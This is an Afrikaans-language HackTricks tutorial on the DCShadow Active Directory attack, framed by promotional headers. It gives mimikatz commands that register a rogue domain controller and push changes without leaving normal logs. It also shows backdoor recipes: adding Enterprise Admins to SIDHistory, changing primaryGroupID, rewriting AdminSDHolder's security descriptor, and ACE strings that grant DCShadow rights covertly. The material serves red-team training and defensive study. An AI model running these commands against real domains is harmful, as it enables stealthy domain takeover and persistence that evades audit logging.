<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>


# DCShadow

Dit registreer 'n **nuwe Domeinbeheerder** in die AD en gebruik dit om aantekeninge (SIDHistory, SPNs...) op gespesifiseerde voorwerpe te **stuur sonder** om enige **logboeke** oor die **veranderings** agter te laat. Jy **benodig DA-voorregte** en moet binne die **hoofdomein** wees.\
Let daarop dat as jy verkeerde data gebruik, sal lelike logboeke verskyn.

Om die aanval uit te voer, het jy 2 mimikatz-instanties nodig. Een daarvan sal die RPC-bediener begin met SYSTEM-voorregte (jy moet hier aandui watter veranderinge jy wil uitvoer), en die ander instantie sal gebruik word om die waardes te stuur:

{% code title="mimikatz1 (RPC-bediener)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (druk) - Benodig DA of soortgelyk" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Let daarop dat **`elevate::token`** nie in die `mimikatz1`-sessie sal werk nie, omdat dit die voorregte van die draad verhoog, maar ons moet die **voorregte van die proses** verhoog.\
Jy kan ook 'n "LDAP" voorwerp kies: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Jy kan die veranderinge vanaf 'n DA of vanaf 'n gebruiker met hierdie minimale toestemmings stuur:

* In die **domeinvoorwerp**:
* _DS-Install-Replica_ (Voeg/Verwyder Replica in Domein by)
* _DS-Replication-Manage-Topology_ (Bestuur Replicasie-topologie)
* _DS-Replication-Synchronize_ (Replicasie-sinkronisering)
* Die **Sites-voorwerp** (en sy kinders) in die **Konfigurasiehouer**:
* _CreateChild en DeleteChild_
* Die voorwerp van die **rekenaar wat as 'n DC geregistreer is**:
* _WriteProperty_ (Nie Skryf nie)
* Die **teiken voorwerp**:
* _WriteProperty_ (Nie Skryf nie)

Jy kan [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) gebruik om hierdie voorregte aan 'n onbevoorregte gebruiker te gee (let daarop dat dit 'n paar logboeke sal agterlaat). Dit is baie beperkend as om DA-voorregte te hê.\
Byvoorbeeld: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Dit beteken dat die gebruikersnaam _**student1**_ wanneer dit aangemeld is op die rekenaar _**mcorp-student1**_, DCShadow-voorregte oor die voorwerp _**root1user**_ het.

## Gebruik van DCShadow om agterdeure te skep

{% code title="Stel Enterprise Admins in SIDHistory in op 'n gebruiker" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="Verander PrimaryGroupID (stel gebruiker as lid van Domeinadministrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Wysig ntSecurityDescriptor van AdminSDHolder (gee Volle Beheer aan 'n gebruiker)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Gee DCShadow-regte met behulp van DCShadow (geen gewysigde regte logs)

Ons moet die volgende ACE's byvoeg met ons gebruiker se SID aan die einde:

* Op die domeinobjek:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Op die aanvallerrekenaarobjek: `(A;;WP;;;UserSID)`
* Op die teikengebruikerobjek: `(A;;WP;;;UserSID)`
* Op die Sites-objek in die Konfigurasiehouer: `(A;CI;CCDC;;;UserSID)`

Om die huidige ACE van 'n objek te kry: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Let daarop dat jy in hierdie geval **verskeie veranderinge** moet maak, nie net een nie. Gebruik dus in die **mimikatz1-sessie** (RPC-bediener) die parameter **`/stack` met elke verandering** wat jy wil maak. Op hierdie manier hoef jy slegs een keer **`/push`** te gebruik om al die vasgesteekte veranderinge in die bedrieglike bediener uit te voer.



[**Meer inligting oor DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
